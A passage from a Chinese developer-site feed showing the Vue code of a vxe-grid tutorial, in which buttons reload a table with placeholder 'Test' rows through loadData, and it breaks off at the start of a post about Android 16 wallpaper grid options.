    { <span class="hljs-attr">id</span>: <span class="hljs-number">10001</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test1'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">28</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10002</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test2'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">22</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Guangzhou'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10003</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test3'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'PM'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10004</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test4'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10005</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test5'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10006</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test6'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10007</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test7'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10013</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test13'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10014</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test14'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">34</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10015</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test15'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10016</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test16'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10017</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test17'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">31</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10018</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test18'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10019</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test19'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">37</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10020</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test20'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">41</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
  ]
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-1">调用方法刷新数据</h2>
<p>除了修改 data 之外，还可以通过调用 loadData、reloadData 方法刷新数据</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bee5837f2dc449883c5ac2c136ffbb1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS-54mb55qE5bCP5LyZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768471378&amp;x-signature=4W4ITREgPgxTnGX1JosiM1NmDrs%3D" alt="22222222222222222-ezgif.com-video-to-gif-converter" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList1Event"</span>&gt;</span>修改1<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList2Event"</span>&gt;</span>修改2<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList3Event"</span>&gt;</span>修改3<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-grid</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"gridRef"</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"gridOptions"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">vxe-grid</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> gridRef = <span class="hljs-title function_">ref</span>()

<span class="hljs-keyword">const</span> gridOptions = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">border</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-number">300</span>,
  <span class="hljs-attr">columns</span>: [
    { <span class="hljs-attr">type</span>: <span class="hljs-string">'seq'</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">70</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'name'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Name'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'sex'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Sex'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'age'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Age'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'address'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Address'</span>, <span class="hljs-attr">showOverflow</span>: <span class="hljs-literal">true</span> }
  ],
  <span class="hljs-attr">data</span>: []
})

<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList1Event</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> $grid = gridRef.<span class="hljs-property">value</span>
  <span class="hljs-keyword">if</span> ($grid) {
    $grid.<span class="hljs-title function_">loadData</span>([
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
    ])
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList2Event</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> $grid = gridRef.<span class="hljs-property">value</span>
  <span class="hljs-keyword">if</span> ($grid) {
    $grid.<span class="hljs-title function_">loadData</span>([
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10003</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test3'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'PM'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10004</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test4'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10005</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test5'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10006</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test6'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10007</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test7'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10013</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test13'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10014</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test14'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">34</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
    ])
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList3Event</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> $grid = gridRef.<span class="hljs-property">value</span>
  <span class="hljs-keyword">if</span> ($grid) {
    $grid.<span class="hljs-title function_">loadData</span>([
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10001</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test1'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">28</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10002</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test2'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">22</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Guangzhou'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10003</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test3'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'PM'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10004</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test4'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10005</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test5'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10006</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test6'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10007</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test7'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10013</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test13'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10014</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test14'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">34</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10015</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test15'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10016</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test16'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10017</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test17'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">31</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10018</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test18'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10019</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test19'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">37</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10020</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test20'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">41</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
    ])
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[安卓16 设置壁纸中应用网格，有两个5X5的选项]]></title>    <link>https://juejin.cn/post/7592805973120679942</link>    <guid>https://juejin.cn/post/7592805973120679942</guid>    <pubDate>2026-01-08T09:50:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973120679942" data-draft-id="7592572266754670655" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="安卓16 设置壁纸中应用网格，有两个5X5的选项"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-08T09:50:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="robotx"/> <meta itemprop="url" content="https://juejin.cn/user/3817944287025453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" 